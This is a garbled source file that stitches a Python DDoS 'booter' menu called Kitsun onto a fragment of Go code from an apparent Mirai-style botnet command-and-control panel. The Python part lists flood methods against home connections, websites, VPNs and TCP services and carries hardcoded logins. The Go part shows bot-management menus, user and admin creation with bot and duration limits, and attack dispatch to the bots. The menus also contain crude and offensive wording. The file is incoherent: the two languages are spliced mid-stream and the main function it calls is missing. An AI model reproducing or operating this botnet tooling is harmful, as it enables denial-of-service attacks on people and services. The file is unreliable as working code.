#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;Ⲕ ι 𝜏 ട ᥙ ɳ\x07")
def modifications():
	print ("Contact Kaz The Net Is Currently Fucking U LEAVE")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
home = """\033[m
╔══════════════════════════════════════════════════════╗
║            \033[90m HOME METHODS\033[90m             ║               
║══════════════════════════════════════════════════════║
║  \033[90mUDP   (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Mix ATTACK\033[90m    ║
║  \033[90mHOME  (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m HOME ATTACK\033[90m   ║
║  \033[90mNuke (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Nuke Flood\033[90m   ║
║  \033[90mZAP (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m HOME Zap\033[90m   ║
║  \033[90mRIP (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Home Flood\033[90m   ║
║  \033[90mSLAP (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m HOME SLAP\033[90m 
║  \033[90mCHARGE (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m HOME CHARGE\033[90m   ║
╚══════════════════════════════════════════════════════╝\033[90m
\033[90mWelcome To Kitsun
"""

Website = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mWebsite Methods\033[91m                     ║               
║══════════════════════════════════════════════════════║
║  \033[00mHTTPOFF (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPOFF Attack.\033[91m       ║
║  \033[00mHTTPSMACK (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPSMACK Attack.\033[91m       ║
║  \033[00mHTTPKILL (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m HTTPKILL Attack.\033[91m      ║
║  \033[00mHTTPHANG (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m HTTPHANG Attack.\033[91m
║  \033[00mHTTPRAPE (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPRAPE Attack.\033[91m
║  \033[00mHTTPLAG (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPLAG Attack.\033[91m
║  \033[00mHTTPCOAT (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m HTTPCOAT Attack.\033[91m
╚══════════════════════════════════════════════════════╝\033[00m
"""

Vpn = """\033[m
╔══════════════════════════════════════════════════════╗
║            \033[90m VPN METHODS\033[90m             ║               
║══════════════════════════════════════════════════════║
║  \033[90mVPNDOWN   (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Down ATTACK\033[90m    ║
║  \033[90mVPNOP  (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m VPN ATTACK\033[90m   ║
║  \033[90mVPNKILL (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m VPN Flood\033[90m   ║
║  \033[90mVPNRIP (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m Secure RIP\033[90m   ║
║  \033[90mCOAT (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m COAT Floodv1\033[90m
║  \033[90mVPNLAG (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m VPNLAG Floodv3\033[90m
║  \033[90mVPNSMACK (IP) (PORT) (TIME) (METHOD)  \033[90m|\033[90m VPNSMACK Floodv2\033[90m
╚══════════════════════════════════════════════════════╝\033[90m
"""

TCP = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mTCP Methods\033[91m                     ║               
║══════════════════════════════════════════════════════║
║  \033[00mAH (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m AH Attack.\033[91m       ║
║  \033[00mACK (HOST) (PORT) (TIME) (METHOD)  \033[91m|\033[00m ACK Attack.\033[91m       ║
║  \033[00mSYN (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m SYN Attack.\033[91m      ║
║  \033[00mFBMP (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m FBMP Attack.\033[91m
║  \033[00mSERVER (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m SERVER Attack.\033[91m 
║  \033[00mSERVERKILL (HOST) (PORT) (TIME) (METHOD) \033[91m|\033[00m SERVERv2 Attack.\033[91m      ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

info = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mⲔ ι 𝜏 ട ᥙ ɳ Info\033[91m ║
║══════════════════════════════════════════════════════║
║ \033[00m[+] Updates ever 2 weeks or less.\033[91m    ║
║ \033[00m[+] Discord Orbits#4087.\033[91m             ║
║ \033[00m[+] More Stuff Coming Soon.\033[91m          ║
║ \033[00m[+] I Love U ~-_-~.\033[91m                  
╚══════════════════════════════════════════════════════╝\033[00m
"""

Commands = """\033[91m
╔══════════════════════════════════════════════════════╗
║                    \033[00mCommands\033[91m          ║
║══════════════════════════════════════════════════════║
║ \033[00mMethods \033[91m|\033[00m Shows Methods For Ⲕ ι 𝜏 ട ᥙ ɳ.\033[91m                 ║                     
║ \033[00mInfo    \033[91m|\033[00m Shows Ⲕ ι 𝜏 ട ᥙ ɳ Info.\033[91m                        ║
║ \033[00mClear   \033[91m|\033[00m Clears Ⲕ ι 𝜏 ട ᥙ ɳ.\033[91m                            ║
║ \033[00mExit    \033[91m|\033[00m Exit Out Of Ⲕ ι 𝜏 ട ᥙ ɳ.\033[91m                       ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

Sus = """\033[91m
╔══════════════════════════════════════════════════════╗
║                    \033[00mSus\033[91m          ║               
║══════════════════════════════════════════════════════║          
║ \033[00mLove \033[91m|\033[00m Ⲕ ι 𝜏 ട ᥙ ɳ Loves U.\033[91m                         
║ \033[00mKitsun    \033[91m|\033[00m Ⲕ ι 𝜏 ട ᥙ ɳ Daddy.\033[91m  
║ \033[00mLook   \033[91m|\033[00m Ur Sus For Reading.\033[91m                       
║ \033[00mPapi    \033[91m|\033[00m Ur Ⲕ ι 𝜏 ട ᥙ ɳ Dad.\033[91m   
╚══════════════════════════════════════════════════════╝\033[00m  
"""                                                               
                                                
banner = """\033[1;00m
 
▒█░▄▀ 　 ░▀░ 　 ▀▀█▀▀ 　 █▀▀ 　 █░░█ 　 █▀▀▄ 
▒█▀▄░ 　 ▀█▀ 　 ░░█░░ 　 ▀▀█ 　 █░░█ 　 █░░█ 
▒█░▒█ 　 ▀▀▀ 　 ░░▀░░ 　 ▀▀▀ 　 ░▀▀▀ 　 ▀░░▀
🇰​​​​​ 🇮​​​​​ 🇹​​​​​ 🇸​​​​​ 🇺​​​​​ 🇳​​​​​                      
Owner ptv.kaz
Co-Owner Cxmpettive                      
"""


cookie = open(".Ⲕ ι 𝜏_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


continue
		}	

        if err != nil || cmd == "Commands" || cmd == "help" || cmd == "?" {
            
            this.conn.Write([]byte("\x1b[1;33m╔═                                          \x1b[1;33m═╗\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mATTACKS  \x1b[90m- \x1b[0mShows The Help list Attacks   \x1b[1;33m║\r\n"));                     
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mRULES    \x1b[90m- \x1b[0mShows A List Of Rules          \x1b[1;33m║\r\n"));              
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mCLEAR    \x1b[90m- \x1b[0mClears Screen                  \x1b[1;33m║\r\n"));      
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mINFO     \x1b[90m- \x1b[0mShows User Info                \x1b[1;33m║\r\n"));        
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;97mADMIN    \x1b[90m- \x1b[0mShows Admin Only Commands      \x1b[1;33m║\r\n"));                              
            this.conn.Write([]byte("\x1b[1;33m╚═                                          \x1b[1;33m═╝\r\n"));
            continue
        }

        if err != nil || cmd == "ADMIN" || cmd == "admin" {
            
            this.conn.Write([]byte("\x1b[1;33m╔═                                     \x1b[1;33m═╗\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mADDREG      \x1b[90m- \x1b[0mCreate A Regular User  \x1b[1;33m║\r\n"));      
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mADDADMIN    \x1b[90m- \x1b[0mCreate A Admin User    \x1b[1;33m║\r\n"));    
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mREMOVEUSER  \x1b[90m- \x1b[0mRemove A User          \x1b[1;33m║\r\n"));   
            this.conn.Write([]byte("\x1b[1;33m╚═                                     \x1b[1;33m═╝\r\n"));


            continue

        }

        if err != nil || cmd == "ATTACKS" || cmd == "attacks" {

            this.conn.Write([]byte("\x1b[1;33m╔═                            \x1b[1;33m═╗\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mUDP  \x1b[90m- \x1b[0mUDP type attacks     \x1b[1;33m║\r\n"));  
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mTCP  \x1b[90m- \x1b[0mTCP type attacks     \x1b[1;33m║\r\n")); 
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mGRE  \x1b[90m- \x1b[0mGRE type attacks     \x1b[1;33m║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSPC  \x1b[90m- \x1b[0mSPECIAL type attacks \x1b[1;33m║\r\n"));     
            this.conn.Write([]byte("\x1b[1;33m╚═                            \x1b[1;33m═╝\r\n"));
            continue
            
        }
        if err != nil || cmd == "RULES" || cmd == "rules" {

            this.conn.Write([]byte("\x1b[1;33m╔═                                \x1b[1;33m═╗\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║ \x1b[1;37m1.\x1b[90m No Spam Hitting              \x1b[1;33m║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║ \x1b[1;37m2.\x1b[90m No Sharing Logins            \x1b[1;33m║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║ \x1b[1;37m3.\x1b[90m No Hitting The Net           \x1b[1;33m║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║ \x1b[1;37m4.\x1b[90m No Hitting Government Sites  \x1b[1;33m║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m╚═                                \x1b[1;33m═╝\r\n"));
            continue
        }
        if err != nil || cmd == "info" || cmd == "INFO" || cmd == "I" || cmd == "i" {
            var BotCount int
            BotCount = clientList.Count()
            this.conn.Write([]byte("\x1b[1;33m╔═                        \x1b[1;33m═╗\r\n"));
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33m║  \x1b[1;37mUser: \x1b[1;93m%s            \x1b[1;33m║\r\n",username)));
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;33m║  \x1b[1;37mBots: \x1b[1;93m%d                 \x1b[1;33m║\r\n",BotCount)));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mVersion: \x1b[1;93mv1.0           \x1b[1;33m║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m╚═                        \x1b[1;33m═╝\r\n"));

            continue
        }
        if err != nil || cmd == "udp" || cmd == "UDP" {
            
            this.conn.Write([]byte("\x1b[1;33m╔═                                ═╗\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mUDP   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));  
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mPLAIN \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));  
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSTD   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));  
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mDNS   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));              
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mVSE   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));               
            this.conn.Write([]byte("\x1b[1;33m╚═                                ═╝\r\n"));
            continue
        }
        if err != nil || cmd == "tcp" || cmd == "TCP" {
            
            this.conn.Write([]byte("\x1b[1;33m╔═                                 ═╗\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mTCPALL \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));  
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSTOMP  \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));  
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mUSYN   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));  
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mASYN   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));              
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mFRAG   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mXMAS   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mACK    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));                            
            this.conn.Write([]byte("\x1b[1;33m╚═                                 ═╝\r\n"));
            continue
        }
        if err != nil || cmd == "GRE" || cmd == "gre" {
            
            this.conn.Write([]byte("\x1b[1;33m╔═                                 ═╗\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mGREETH \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));  
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mGREIP  \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));                             
            this.conn.Write([]byte("\x1b[1;33m╚═                                 ═╝\r\n"));
            continue
        }
        if err != nil || cmd == "SPC" || cmd == "spc" {
            
            this.conn.Write([]byte("\x1b[1;33m╔═                                 ═╗\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mOVH-V2 \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));  
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mNFO    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mAWE    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mCIA    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mICE    \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mPACK   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSHOCK  \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mRUSE   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mHTVAC  \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mSTLE   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));
            this.conn.Write([]byte("\x1b[1;33m║  \x1b[1;37mHTTP   \x1b[1;33m[\x1b[1;37mip\x1b[1;33m] \x1b[1;33m[\x1b[1;37mtime\x1b[1;33m] \x1b[1;37mdport=\x1b[1;33m[\x1b[1;37mport\x1b[1;33m]  ║\r\n"));                             
            this.conn.Write([]byte("\x1b[1;33m╚═                                 ═╝\r\n"));
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDREG" {
            this.conn.Write([]byte("\x1b[1;33mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;33mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;33mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;33mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;33mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m- New User Info - \r\n- Username - \x1b[1;93m" + new_un + "\r\n\033[0m- Password - \x1b[1;93m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;93m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;93m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;93m" + cooldown_str + "   \r\n\x1b[1;33mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;33mUser Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "REMOVEUSER" {
            this.conn.Write([]byte("\x1b[1;33mUsername: \x1b[0m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \x1b[1;33mAre You Sure You Want To Remove \x1b[1;93m" + rm_un + "\x1b[1;33m?(y/n): \x1b[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\x1b[1;33mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDADMIN" {
            this.conn.Write([]byte("\x1b[1;33mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;33mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;33mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;33mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;33mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m- New User Info - \r\n- Username - \x1b[1;93m" + new_un + "\r\n\033[0m- Password - \x1b[1;93m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;93m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;93m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;93m" + cooldown_str + "   \r\n\x1b[1;33mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;33mAdmin Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;93m%s \x1b[0m[\x1b[1;93m%d\x1b[0m]\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;93mTotal \x1b[0m[\x1b[1;93m%d\x1b[0m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var BotCount int
                    BotCount = clientList.Count()
                    this.conn.Write([]byte(fmt.Sprintf("\033[90mAttack Sent To: %d \x1b[1;33mBots  \r\n", BotCount)))
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}




try:
	users = ["Ace", "guests"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username (Enter Username): ")
	if username in users:
		user = username
	else:
		print ("Login Incorrect")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["OrbitsKaz", "gayman"]
	password = getpass.getpass ("[+] Password (Enter Password): ")
	if user == "Ace":
		if password == passwords[0]:
			print ("Login Successful")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[90m@Ⲕ ι 𝜏 ട ᥙ ɳ\033[00m] CTRL has been pressed")
				main()
		else:
			print ("Login Incorrect")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mⲔ ι 𝜏 \033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()